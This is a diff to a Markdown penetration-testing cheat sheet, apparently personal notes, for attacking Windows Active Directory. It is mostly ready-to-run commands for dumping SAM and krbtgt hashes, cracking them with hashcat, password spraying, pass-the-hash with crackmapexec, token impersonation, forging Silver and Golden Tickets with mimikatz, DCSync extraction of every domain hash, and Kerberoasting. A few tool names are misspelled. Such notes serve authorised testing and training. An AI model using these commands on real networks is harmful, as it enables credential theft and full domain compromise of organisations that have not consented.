@@ -1,5 +1,6 @@
 # Summary
 
+## Password-based and Hash-based attack
 `Extracting hashes`
 
          SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
@@ -22,16 +23,82 @@
          ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
          ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
+`Password Spraying`
+
+ -   Create Password List  
+     `crunchy <length> <length> -t <pw-core>%%%% `
+   
+-    Spray  
+     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
+
 `PASS THE PW & HASH`
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
          crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
 
+
+## Ticket and Token based
 `Token Impersonation`
 
          meterpreter load icognito  
          list_tokens  
          impersonate_token <token>  
+
+### Silver Ticket - Pass the Ticket
+-> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
+
+-> Get SID
+```
+GetDomainsid (PowerView)
+```
+or  
+```
+whoami /user
+```
+-> Get Machine Account Hash
+```
+Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
+```
+-> Exploitation mimikatz.exe
+```
+kerberos::purge
+kerberos::list
+kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
+```
+or
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
+kerberos::list
+```
+
+### Golden Ticket - Pass the Ticket
+-> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
+
+-> Get hash krbtgt
+```
+./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
+```
+-> Get SID
+```
+GetDomainsid (PowerView)
+```
+or  
+```
+whoami /user
+```
+
+-> Exploitation
+```
+mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"
+
+psexec.exe \\dc1 cmd.exe
+```
+
+### DCSync Attack
+-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
+```
+./mimikatz.exe "lsadump::dcsync /user:Administrator"
+```
 
 `Kerberoasting`
 
@@ -40,13 +107,7 @@
          https://github.com/skelsec/kerberoast
          GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
 
-`Password Spraying`
 
- -   Create Password List  
-     `crunchy <length> <length> -t <pw-core>%%%% `
-   
--    Spray  
-     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`
      
 
 # Tools Introduction
